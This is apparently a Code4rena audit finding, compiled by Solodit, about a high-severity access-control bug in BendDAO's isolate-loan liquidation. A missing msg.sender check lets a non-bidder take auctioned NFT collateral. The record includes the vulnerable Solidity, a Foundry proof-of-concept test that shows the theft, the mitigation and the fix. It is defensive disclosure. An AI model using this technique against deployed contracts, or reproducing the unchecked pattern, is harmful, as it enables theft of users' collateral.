---
# Core Classification
protocol: BendDAO
chain: everychain
category: access_control
vulnerability_type: access_control

# Attack Vector Details
attack_type: access_control
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 36881
audit_firm: Code4rena
contest_link: https://code4rena.com/reports/2024-07-benddao
source_link: https://code4rena.com/reports/2024-07-benddao
github_link: https://github.com/code-423n4/2024-07-benddao-findings/issues/14

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.00
financial_impact: high

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:
  - access_control

protocol_categories:
  - lending

# Audit Details
report_date: unknown
finders_count: 3
finders:
  - 0x73696d616f
  - bin2chen
  - oakcobalt
---

## Vulnerability Title

[H-07] Anyone can get the NFT collateral token after an Auction without bidding due to missing check on `msg.sender`

### Overview


Summary:

The bug is in the IsolateLogic.sol file, where a missing check on `msg.sender` allows anyone to take the collateral NFT token during the liquidation of an isolate loan. This means that even if someone did not participate in the auction, they can still receive the collateral. A proof of concept test was provided to demonstrate this issue. The recommended mitigation step is to add a check to ensure that `msg.sender` is the last bidder. This issue falls under the category of Access Control. The bug has been fixed in the code.

### Original Finding Content


<https://github.com/code-423n4/2024-07-benddao/blob/117ef61967d4b318fc65170061c9577e674fffa1/src/libraries/logic/IsolateLogic.sol#L477>

In IsolateLogic.sol, liquidation of an isolate loan can only be placed after the auction period is passed with bidding. The problem is that there is a missing check on `msg.sender` in isolate liquidation flow, which allows anyone to take the collateral NFT token.

```solidity
//src/libraries/logic/IsolateLogic.sol
  function executeIsolateLiquidate(InputTypes.ExecuteIsolateLiquidateParams memory params) internal {
  ...
    if (params.supplyAsCollateral) {
        //@audit due to no check on msg.sender, anyone calls isolateLiquidate will get the collateral nft
 |>     VaultLogic.erc721TransferIsolateSupplyOnLiquidate(nftAssetData, params.msgSender, params.nftTokenIds);
    } else {
      VaultLogic.erc721DecreaseIsolateSupplyOnLiquidate(nftAssetData, params.nftTokenIds);

 |>     VaultLogic.erc721TransferOutLiquidity(nftAssetData, params.msgSender, params.nftTokenIds);
    }
  ...
```

https://github.com/code-423n4/2024-07-benddao/blob/117ef61967d4b318fc65170061c9577e674fffa1/src/libraries/logic/IsolateLogic.sol#L473

Flows: `IsolateLiquidation::isolateLiquidate -> IsolateLogic.executeIsolateLiquidate()`. Note that `msg.sender` is passed from `isolateLiquidate()` to the end of `executeIsolateLiquidate()` without any checks.

### Proof of Concept

See added unit test `test_Anyone_Can_LiquidateWETH()`. Only `tsLiquidator1` auctioned, but `tsBorrower2` can liquidate and receive collaterals:

```solidity
//test/integration/TestIntIsolateLiquidate.t.sol
...
  function test_Anyone_Can_LiquidateWETH() public {
    TestCaseLocalVars memory testVars;

    // deposit
    prepareWETH(tsDepositor1);
    uint256[] memory tokenIds = prepareIsolateBAYC(tsBorrower1);

    // borrow
    prepareBorrow(tsBorrower1, address(tsBAYC), tokenIds, address(tsWETH));

    // make some interest
    advanceTimes(365 days);

    // drop down nft price
    actionSetNftPrice(address(tsBAYC), 5000);

    // auction
    prepareAuction(tsLiquidator1, address(tsBAYC), tokenIds, address(tsWETH));

    // end the auction
    advanceTimes(25 hours);

    uint256[] memory liquidateAmounts = new uint256[](tokenIds.length);
    testVars.loanDataBefore = getIsolateLoanData(tsCommonPoolId, address(tsBAYC), tokenIds);
    for (uint256 i = 0; i < tokenIds.length; i++) {
      testVars.totalBidAmount += testVars.loanDataBefore[i].bidAmount;
      testVars.totalBidFine += testVars.loanDataBefore[i].bidFine;
      testVars.totalRedeemAmount += testVars.loanDataBefore[i].redeemAmount;
      testVars.totalBorrowAmount += testVars.loanDataBefore[i].borrowAmount;
    }

    testVars.poolBalanceBefore = tsWETH.balanceOf(address(tsPoolManager));
    testVars.walletBalanceBefore1 = tsWETH.balanceOf(address(tsLiquidator1));
    testVars.walletBalanceBefore2 = tsWETH.balanceOf(address(tsBorrower1));
    testVars.erc721BalanceBefore1 = tsBAYC.balanceOf(address(tsLiquidator1));

    // liquidate
    // note: check tsBorrower2 can liquidate and receive nfts without bidding.
    tsBorrower2.isolateLiquidate(tsCommonPoolId, address(tsBAYC), tokenIds, address(tsWETH), liquidateAmounts, false);
    testVars.erc721BalanceAfter1 = tsBAYC.balanceOf(address(tsBorrower2));
    assertEq(
      testVars.erc721BalanceAfter1,
      (testVars.erc721BalanceBefore1 + tokenIds.length),
      'tsLiquidator1 bayc balance'
    );

    }
...
```

Run test `forge test --match-contract TestIntIsolateLiquidate --match-test test_Anyone_Can_LiquidateWETH`:

```
Ran 1 test for test/integration/TestIntIsolateLiquidate.t.sol:TestIntIsolateLiquidate
[PASS] test_Anyone_Can_LiquidateWETH() (gas: 1671088)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 21.76ms (3.41ms CPU time)
```

### Recommended Mitigation Steps

Add check `msg.Sender` is the `lastBidder`.

### Assessed type

Access Control

**[thorseldon (BendDAO) confirmed and commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/14#issuecomment-2297853677):**
 > Fixed [here](https://github.com/BendDAO/bend-v2/commit/79c5e34248949871cae035c573ca256f3178da84).

***



### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Code4rena |
| Protocol | BendDAO |
| Report Date | N/A |
| Finders | 0x73696d616f, bin2chen, oakcobalt |

### Source Links

- **Source**: https://code4rena.com/reports/2024-07-benddao
- **GitHub**: https://github.com/code-423n4/2024-07-benddao-findings/issues/14
- **Contest**: https://code4rena.com/reports/2024-07-benddao

### Keywords for Search

`Access Control`

